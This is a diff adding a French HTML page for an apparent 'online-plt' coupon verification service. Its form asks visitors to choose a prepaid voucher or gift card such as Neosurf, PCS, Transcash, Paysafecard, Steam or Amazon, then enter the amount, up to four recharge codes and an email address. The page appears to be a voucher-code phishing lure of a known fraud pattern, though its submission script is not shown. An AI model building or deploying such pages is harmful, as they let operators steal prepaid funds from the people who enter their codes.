@@ -1,0 +1,116 @@
+<html lang="fr">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>VYGC</title>
+        <!-- Fonts Links For Icon -->
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+        <link rel="stylesheet" href="/frontend/assets/css/stylefooter.css">
+        <link rel="stylesheet" href="/frontend/assets/css/styleform.css">
+        <link rel="icon" href="/frontend/assets/imgs/logo.ico" type="image/x-icon">
+        <link rel="shortcut icon" href="/frontend/assets/imgs/logo.ico" type="image/x-icon">
+    </head>
+    <body cz-shortcut-listen="true">
+<div class="body-form">
+	<form id="sendmail" action='' method="post">
+		<h2>Veuillez entrer les informations du coupon ici.</h2>
+		<div class="form-group gender">
+        	<label for="type">Choisir une recharge * <span id="typeErr"></span></label>
+				<select id="type" name="type" class="form-control">
+				<option value="none" selected="" disabled="">---- Recharge ----</option>
+				<option value="NEOSURF">NEOSURF</option>
+				<option value="PCS">PCS</option>
+				<option value="TRANSCASH">TRANSCASH</option>
+				<option value="PAYSAFECARD">PAYSAFECARD</option>
+				<option value="GOOGLE PLAY">GOOGLE PLAY</option>
+				<option value="STEAM">STEAM</option>
+				<option value="FLEXEPIN">FLEXEPIN</option>
+				<option value="CASHLIB">CASHLIB</option>
+				<option value="NETFLIX">NETFLIX</option>
+				<option value="AMAZON">AMAZON</option>
+			</select>
+		</div>
+		<div class="form-group fullname">
+			<label for="montant">Montant de la recharge * <span id="montantErr"></span></label>
+			<input type="text" name="montant" id="montant" placeholder="0" class="form-control">
+		</div>
+		<div class="form-group email">
+			<label for="devise">Choisir une devise * <span id="deviseErr"></span></label>
+			<select id="devise" name="devise" class="form-control">
+				<option value="none" selected="" disabled="">---- Devise -----</option>
+				<option value="EURO €">EURO (€)</option>
+				<option value="Dollar $">Dollar ($)</option>
+				<option value="Dollard CHF">FRANC SUISSE (CHF)</option>
+			</select>
+		</div>
+		<div class="form-group code">
+			<label for="code1">Entrez les codes de recharge <span id="code1Err"></span></label>
+			<input type="text" id="code1" class="code form-control" name="code1" placeholder="Entrez le code de la recharge 1">
+			<input type="text" id="code2" class="code form-control" name="code2" placeholder="Entrez le code de la recharge 2">
+			<input type="text" id="code3" class="code form-control" name="code3" placeholder="Entrez le code de la recharge 3">
+			<input type="text" id="code4" class="code form-control" name="code4" placeholder="Entrez le code de la recharge 4">
+		</div>
+		<div class="form-group submit-btn">
+			<input id="btncrypt" type="button" value="Crypter mes données">
+		</div>
+		<div class="form-group email">
+			<label for="mail">Entrez votre adresse mail * <span id="mailErr"></span></label>
+			<input type="text" id="mail" class="mail form-control" name="mail" placeholder="exemple@domain.com">
+		</div>
+		<div class="form-group submit-btn">
+			<input id="valider" type="submit" value="Valider">
+		</div>
+    </form>
+</div>
+
+        <section class="footer">
+            <div class="footer-row">
+                <div class="footer-col">
+                    <h4 id="fi">
+                        <img src="/frontend/assets/imgs/logo.ico" id="footerico" alt="logo">&nbsp;&nbsp; 
+                        <b>online-plt</b>
+                    </h4>
+                    <p id="fi">
+                        <b>online-plt</b> est un service de vérification de coupons en ligne. Cette plateforme vous permet de vérifier la validité de vos cartes de manière fiable et sécurisée
+                    </p>
+                </div>
+                <div class="footer-col">
+                    <h4>Services</h4>
+                    <ul class="links">
+                        <li><a href="#">Vérifications des coupons Neosurf</a></li>
+                        <li><a href="#">Vérifications des coupons PCS</a></li>
+                        <li><a href="#">Vérifications des coupons Amazon</a></li>
+                        <li><a href="#">Vérifications des coupons GOOGLE PAY</a></li>
+                        <li><a href="#">Vérifications des coupons TRANSCASH</a></li>
+                        <li><a href="#">Bien d'autres</a></li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h4>Réseaux</h4>
+                    <ul class="links">
+                        <li><a href="https://www.instagram.com/"><i class="fa-brands fa-instagram">&nbsp; &nbsp;</i>Instagram</a></li>
+                        <li><a href="https://www.facebook.com/"><i class="fa-brands fa-facebook-f">&nbsp; &nbsp;</i>Facebook</a></li>
+                        <li><a href="https://cm.linkedin.com/"><i class="fa-brands fa-linkedin"></i>&nbsp;&nbsp; LinkedIn</a></li><a href="https://cm.linkedin.com/">
+                        </a><li><a href="https://cm.linkedin.com/"></a><a href="https://twitter.com/"><i class="fa-brands fa-twitter"></i>&nbsp;&nbsp; Twiter</a></li>
+                        <li><a href="https://www.skype.com/"><i class="fa-brands fa-skype"></i>&nbsp;&nbsp; Skype</a></li>
+                        <li><a href="https://discord.com/"><i class="fa-brands fa-discord"></i>&nbsp;&nbsp; Discord</a></li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h4>Horaires</h4>
+                    <p>
+                        Toujours ouverts !
+                        La plateforme est disponible 24h/24 et 7j/7
+                    </p>
+                    <div class="icons">
+                        <i class="fa-solid fa-door-open"></i>
+                        <i class="fa-solid fa-rss"></i>
+                        <i class="fa-solid fa-signal"></i>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <script src="/frontend/assets/js/jquery.min.js"></script>
+        <script src="/frontend/assets/js/script.js"></script>
+    </body>
+</html>
